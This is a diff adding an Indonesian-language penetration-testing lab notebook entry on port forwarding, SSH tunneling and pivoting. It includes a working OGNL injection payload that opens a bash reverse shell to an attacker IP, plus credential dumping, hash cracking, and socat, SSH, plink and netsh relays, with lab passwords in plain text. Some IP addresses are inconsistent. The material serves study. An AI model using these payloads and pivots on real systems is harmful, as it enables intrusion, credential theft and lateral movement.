@@ -2269,3 +2269,299 @@ Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
 ```
 
 Disini kita berhasil mendapatkan password administrator melalui memssp pada mimikatz
+
+#### Learn day 19
+Akhirnya bisa belajar kembali pada module offsec, hari ini kita akan belajar di module port redirection dan ssh tunneling. Jadi kali ini kita akan explore terkait module ini
+
+
+pertama kita diberikan suatu instance IP dimana terdapat service yang running di port 8090, dan setelah dilakukan enumeration ternyata rentan OGNL injection, jadi kita bisa execute payload seperti ini untuk reverse shell
+
+```
+${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
+```
+
+yang jika kita lakukan curl dan encoding url akan seperti ini 
+```
+curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/443%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+
+jangan lupa aktifkan listener 
+
+```
+nc -lnvp 443
+```
+
+lalu, jika sudah berhasil kita bisa melihat file /var/atlassian/application-data/confluence/confluence.cfg.xml yang berisi suatu credential untuk psql
+
+```
+    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
+    <property name="hibernate.connection.url">jdbc:postgresql://10.4.172.215:5432/confluence</property>
+    <property name="hibernate.connection.username">postgres</property>
+
+```
+
+tapi problemnya adalah, kita tidak bisa langsung connect ke IP melalui machine attacker maka dari itu kita perlu melakukan port forwarding menggunakan socat. 
+
+```
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+```
+
+jadi kita akan redirect traffic dari port 2345 pada machine yang compromised ke IP internal 10.4.50.215. Jadi kita bisa langsung login dengan command 
+
+```
+psql -h 192.168.172.63 -p 2345 -U postgres
+```
+
+Jika terdapat input, masukan password yang kita dapatkan. Selanjutnya kita cek database dan melihat isi table cwd_user
+
+```
+
+//untuk cek db
+\l
+
+//masuk pada db confluence
+\c confluence
+
+//untuk describe table cwd_user
+\d cwd_user
+
+//select data pada table cwd_user
+select * from cwd_user
+
+//or kita hanya ingin column tertentu aja
+select credential from cwd_user;
+
+```
+Setelah mendapatkan passwordnya, kita bisa melakukan cracking menggunakan hashcat pada mode 12001
+
+```
+hashcat -m 12001 pass_hash.txt /usr/share/wordlists/fasttrack.txt  
+```
+
+Disini kita berhasil melakukan cracking dengan hashcat, selanjutnya kita lakukan login ssh dengan credential dari hash password tersebut dengan username database_admin. Jadi kita perlu set port forwarding pada port 22 di postgres machine yang diakses dari machine external di port 2222
+
+```
+socat -ddd TCP-LISTEN:2222,fork TCP:10.4.172.215:22
+```
+
+Selanjutnya login ssh dengan credential database_admin:sqlpass123 dan ambil flag pada /tmp/socat_flag.
+
+
+
+Jika kita dihadapkan skenario saat di server yang kita lakukan pentest tidak ada tools internal, alternatif cara cepat untuk melakukan enumeration yaitu port scanning dengan bash script seperti berikut
+```
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
+```
+
+##### SSH Local port forwarding 
+
+Anggaplah kita mempunyai suatu akses pada machine yang menghubungkan dari external kedalam DMZ network, dan kita ingin melakukan akses pada machine internal melalui machine yang sudah kita compromised jadi kita bisa melakukan ssh local port forwarding. dan dalam contoh kasus dibawah ini, kita akan menghubungkan IP local 172.16.50.217 pada port 445 agar smb dapat diakses pada 192.168.172.63 di port 4455
+```
+
+//di IP 
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+```
+
+Setelah dilakukan local port forwarding, kita bisa langsung melakukan akses pada machine external dengan port 4455 yang kita tentukan dan akan di forward ke 172.16.50.217 di port 445
+
+
+```
+//listing directory / shares
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+
+//Connect to specific share
+smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
+```
+
+
+#### SSH Dynamic port forwarding
+port forward sebenarnya memiliki keterbatasan, yaitu kita hanya bisa koneksi pada 1 socket saja. Solusinya yaitu dengan melakukan dynamic port forwarding dengan menggunakan socks proxy dan dengan cara ini seharusnya akan lebih flexible. Disini, SSH akan menjadi listener socks yang kemudian kita akan konfigurasi menggunakan proxychains yang melakukan bind pada address dan port listener SSH.
+
+Disini, kita berhasil compromised machine A, dimana pada machine A ini kita ingin jadikan relay socks untuk akses pada machine B(internal) jadi caranya yaitu melakukan dynamic forwarding  dari machine A ke machine B(internal) yang expose port untuk dijadikan listener.
+
+Contoh disini, kita membuka port 9999 yang akan kita jadikan listener proxy dilanjut SSH ke machine B(internal) pada IP 10.4.50.215
+```
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+```
+
+Selanjutnya, port 9999 akan berjalan jadi kita akan setup proxychains pada local kali kita di file /etc/proxychains4.conf dan kita tambahkan pada baris paling bawah
+
+```
+socks5 192.168.50.63 9999
+```
+
+Dimana IP 192.168.50.63 merupakan machine A yang akan kita gunakan lompatan untuk akses ke machine B(internal) di port yang sudah kita tentukan sebelumnya. Kemudian kita dengan mudah akses jaringan pada subnet internal yang seolah olah request kita berasal dari machine B(internal) menggunakan proxychains 
+```
+proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+```
+
+Kita juga bisa menggunakan proxychains untuk melakukan nmap scanning pada top 20 port seperti berikut: 
+```
+sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
+```
+
+
+#### Remote Port Forwarding 
+
+Dengan local port forwarding kita bisa melakukan pivoting pada internal network, tapi bagaimana jika ada suatu firewall maupun IDS/IPS yang memblock semua inbound traffic kita ? jadi solusinya yaitu dengan Remote Port Forwarding, jadi alih alih kita buka suatu koneksi/port pada machine yang compromised, disini kita akan melakukan SSH pada local machine kita dari machine yang sudah compromised. 
+
+Jadi dengan remote port forwarding, kita akan membuka koneksi SSH ke machine attacker dari machine korban dengan host / port tujuan yang kita tentukan, dan nantinya attacker akan bisa akses host tersebut secara local. Jadi kita perlu start ssh dulu 
+
+```
+sudo systemctl start ssh
+
+//check port
+sudo ss -ntplu
+```
+dan pada file **/etc/ssh/sshd_config** set **PasswordAuthentication** ke Yes
+
+Dan jika berhasil dan port 22 terbuka, kita bisa langsung melakukan forwarding dari host victim. Contoh dibawah ini, kita akan membuka port 2345 pada machine attacker yang pada port tersebut akan memforward ke 10.4.50.215 di port 5432
+
+```
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+```
+
+dan cek di local kita 
+```
+ss -ntplu
+```
+
+Jika port 2345 ada, maka port forwarding seharusnya berhasil. dan kita bisa langsung akses service postgres yang sudah kita lakukan forward 
+
+```
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
+
+
+##### SSH Remote Dynamic Port Forwarding
+
+Disini konsepnya sama seperti Remote Port Forwarding, tapi alih alih hanya 1 koneksi dan host kita bisa membuatnya menjadi dinamis, dan kita juga akan memanfaatkan socks dan proxychains.
+
+Dibawah ini, kita buka port 9998 pada local kali dari machine yang compromised
+```
+ssh -N -R 9998 kali@192.168.118.4
+```
+selanjutnya kita konfigurasi pada /etc/proxychains4.conf dengan penyesuaian host dan port pada bagian bawah
+
+```
+socks5 127.0.0.1 9998
+```
+
+lalu kita coba nmap dengan proxychains seharusnya internal network berhasil diakses 
+```
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+```
+
+
+##### Using shuttle
+
+Menggunakan manual ssh binary akan sangat ribet, tapi untungnya ada tools untuk melakukan automation hal ini. Anggaplah, kita ingin melakukan enumeration pada subnet jaringan B internal melalui perantara host A yang compromised.
+
+Yang pertama kita pasti perlu untuk SSH pada host B, tapi karena kita tidak bisa karena host B berada pada segment local, maka kita set dulu dari host A untuk forward ssh ke host B menggunakan socat
+
+```
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+```
+
+jadi command diatas, host A akan membuka port 2222 yang meneruskan ke host B pada port 22. Selanjutnya tinggal kita running sshuttle pada local machine kita
+
+Dibawah ini, kita akan melakukan koneksi SSH pada host B melalui host A dan dengan shuttle kita bisa menentukan subnet yang akan kita lakukan enumeration dengan catatan subnet tersebut ada dan tersimpan pada routing table 
+```
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+```
+
+Setelah berhasil seharusnya kita bisa langsung lakukan akses smb pada IP internal
+
+```
+smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+```
+
+
+##### Windows Tools
+
+###### ssh.exe
+Ini sama saja seperti ssh binary pada linux, jadi kita bisa melakukan dynamic port forwarding dari sini seperti 
+
+```
+ssh -N -R 9998 kali@192.168.118.4
+```
+
+dan set /etc/proxychains4.conf ke : 
+```
+socks5 127.0.0.1 9998
+```
+
+yang nantinya bisa langsung diakses 
+
+```
+proxychains psql -h 10.4.50.215 -U postgres
+```
+
+
+###### plink.exe
+
+Plink juga bisa digunakan untuk melakukan port forwarding, contohnya kita akan membuka port 9833 pada local kali yang dimana port ini akan memforward pada port 3389(RDP) pada machine windows.
+
+```
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+
+
+//or auto confirmation
+
+cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+```
+
+dan jika cek portnya ada maka seharusnya berhasil
+```
+ss -ntplu
+```
+
+Jadi kita bisa langsung melakukan login RDP melalui port 9833
+
+```
+xfreerdp3 /u:offsec /p:lab /v:127.0.0.1:9833 /sec:nla
+
+```
+
+###### netsh
+
+Sebenarnya ada cara default untuk melakukan port di windows menggunakan netsh tapi hal ini memerlukan akses administrator.
+
+Jadi perintah dibawah ini kita melisten port 2222 pada machine A yang sudah kita compromised dan port 2222 ini yang jika kita lakukan koneksi akan memforward ke IP internal 10.4.50.215 pada port 22
+
+```
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+```
+
+Lalu untuk ceknya apakah port forwarding berjalan, bisa menggunakan netstat
+```
+netstat -anp TCP | find "2222"netstat -anp TCP | find "2222"
+```
+Jika ada, maka seharusnya berhasil. dan disini kita juga bisa untuk melihat seluruh konfigurasi netsh
+```
+netsh interface portproxy show all
+```
+
+Disini kita tidak bisa langsung melakukan koneksi pada port 2222 karena adanya firewall dan oleh karena itu kita bisa allow/izinkan agar bisa diakses dari public
+
+```
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+```
+
+dan seharusnya kita bisa melakukan login ssh dengan lancar
+
+```
+ssh database_admin@192.168.50.64 -p2222
+```
+
+Setelah itu kita bisa menghapus rule tersebut jika tidak dipakai dengan command : 
+
+```
+
+//using name
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+
+
+//using rule 
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+```
